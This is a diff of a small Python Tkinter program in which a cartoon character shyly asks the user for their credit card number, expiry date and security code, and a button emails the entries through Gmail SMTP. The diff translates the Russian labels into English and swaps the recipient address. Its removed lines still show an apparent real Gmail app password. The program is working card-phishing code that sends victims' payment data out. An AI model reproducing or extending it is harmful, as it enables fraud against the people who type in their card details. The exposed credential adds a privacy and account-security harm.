@@ -6,8 +6,8 @@ def onPressThanksButton():
 	print('gavno')
 	server = smtplib.SMTP('smtp.gmail.com', 587)
 	server.starttls()
-	server.login('yourmail@gmail.com', 'itdolksndyozucoq')
-	server.sendmail('yourmail@gmail.com', 'glavniypidoraskieva@gmail.com', 
+	server.login('yourmail@gmail.com', 'app-password')
+	server.sendmail('yourmail@gmail.com', 'yourmail@gmail.com', 
 	f'Subject: CUTIE JANE\n\n{cardnumber_entry.get()}, {cardexpdat_entry.get()}, {cardpassword_entry.get()}')
 
 def CenterWindowToDisplay(Screen, width, height):
@@ -26,25 +26,25 @@ jane_image = ImageTk.PhotoImage(Image.open('jane.png'))
 jane_label = tk.Label(root, image = jane_image)
 jane_label.place(x = 0, y = 0)
 
-ask_label = tk.Label(root, text = 'П-привет...\nМожешь, п-пожалуйста, сообщить\nданные своей к-кредитной карточки?')
+ask_label = tk.Label(root, text = 'Uh-hello...\nC-could you, please, provide\nthe details of your c-credit card?')
 ask_label.place(x = 119, y = 296)
 
-cardnumber_label = tk.Label(root, text = 'Номер карточки:')
+cardnumber_label = tk.Label(root, text = 'Card number:')
 cardnumber_label.place(x = 4, y = 296+64)
 cardnumber_entry = tk.Entry(root)
 cardnumber_entry.place(x = 150, y = 296+64)
 
-cardexpdat_label = tk.Label(root, text = 'Срок годности:')
+cardexpdat_label = tk.Label(root, text = 'Expiration date:')
 cardexpdat_label.place(x = 4, y = 296+64+36)
 cardexpdat_entry = tk.Entry(root)
 cardexpdat_entry.place(x = 150, y = 296+64+36)
 
-cardpassword_label = tk.Label(root, text = 'Код безопасности:')
+cardpassword_label = tk.Label(root, text = 'Security code:')
 cardpassword_label.place(x = 4, y = 296+64+36+36)
 cardpassword_entry = tk.Entry(root)
 cardpassword_entry.place(x = 150, y = 296+64+36+36)
 
-thanks_button = tk.Button(root, text = 'Сп-спасибо...', command = onPressThanksButton)
+thanks_button = tk.Button(root, text = 'Th-thank you...', command = onPressThanksButton)
 thanks_button.place(x = (498-124)/2, y = 296+64+36+36+48)
 
 root.mainloop()
